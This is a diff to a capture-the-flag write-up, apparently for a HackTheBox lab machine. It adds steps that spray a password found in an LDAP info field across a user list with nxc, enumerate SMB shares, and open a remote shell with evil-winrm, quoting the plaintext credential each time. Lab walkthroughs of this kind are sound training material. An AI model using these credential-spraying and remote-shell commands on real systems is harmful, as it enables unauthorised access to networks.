@@ -72,8 +72,16 @@ something's interesting in one of it's user bearing `info` tag
 `cat ldapsearch.txt | grep info`
 ![[Pasted image 20250506190914.png]]
 
+**verify credential 2**
+`nxc smb rhost -u users.txt -p 'Ironside47pleasure40Watchful' --continue-on-success`
+the account `support` uses that password
 
-	
+**dump shares with support user**
+`nxc smb 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful' --shares    `
+
+**connect and spawn shell**
+`evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'`
+
 
 ---
 <h3>QUESTIONS</h3>
